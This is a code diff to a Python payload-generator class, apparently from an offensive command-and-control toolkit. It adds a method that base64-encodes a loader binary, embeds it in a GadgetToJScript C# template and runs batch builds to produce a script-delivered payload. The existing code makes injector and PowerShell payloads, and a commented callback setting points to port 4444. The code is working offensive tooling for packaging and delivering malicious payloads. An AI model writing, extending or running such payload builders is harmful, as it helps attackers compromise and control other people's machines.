@@ -39,13 +39,51 @@ class mypayloadgen():
         self.__compress_toinject = "tools\\Inject.exe"
         self.__compress_outputname = "Invoke-Compression.ps1"
 
+        self.__base64_template = "Invoke-Base64.ps1"
+        self.__base64_file_tag = r"%%filename%%"
+        self.__base64_topayload = "payload\\loader.bin"
+
+        self.__gtojs_template = "GadgetToJScript.cs"
+        self.__gtojs_toCS = "Client\\external\\GadgetToJScript\\"
+        self.__gtojs_outputname = "GadgetToJScript.cs"
+        self.__gtojs_payload_tag = r"%%PAYLOAD%%"
+
+
+
+
         self.__mystd = subprocess.DEVNULL
 
     def debug_mode(self,inbool):
         if inbool:
-            self.__mystd = subprocess.STDOUT
+            self.__mystd = None
         else:
             self.__mystd = subprocess.DEVNULL
+
+
+    def gen_gtojs(self):
+        mycwd = os.path.join(self.__parentdir,self.__to_client)
+        #regen exe first
+        subprocess.run(["build.bat"], shell=True, cwd=mycwd, stdout=self.__mystd)
+
+        #pre-compile config
+        subprocess.run(["conf-gtojs.bat"], shell=True, cwd=mycwd, stdout=self.__mystd)
+
+        with open(os.path.join(self.__parentdir,self.__to_template,self.__base64_template),mode='r') as f:
+            all_of_it = f.read()
+        
+        with open(os.path.join(self.__parentdir,self.__to_tools,self.__base64_template),mode='w') as f:
+            f.write(all_of_it.replace(self.__base64_file_tag,self.__base64_topayload))
+        
+        output = subprocess.run(["b64gen.bat"], capture_output=True, shell=True, cwd=mycwd)
+        myb64 = output.stdout.decode("utf-8")[:-2] #remove new line and EOF
+
+        with open(os.path.join(self.__parentdir,self.__to_template,self.__gtojs_template),mode='r') as f:
+            all_of_it = f.read()
+        
+        with open(os.path.join(self.__parentdir,self.__gtojs_toCS,self.__gtojs_outputname),mode='w') as f:
+            f.write(all_of_it.replace(self.__gtojs_payload_tag,myb64))
+        
+        subprocess.run(["gtojs.bat"], shell=True, cwd=mycwd, stdout=self.__mystd)
 
 
     def gen_ps1(self):
@@ -175,6 +213,6 @@ class mypayloadgen():
 if __name__ == "__main__":
     t_mypayloadgen = mypayloadgen()
     #t_mypayloadgen.set_config("socket",False,"127.0.0.1",4444)
-    t_mypayloadgen.gen_inject()
+    t_mypayloadgen.gen_gtojs()
 
 
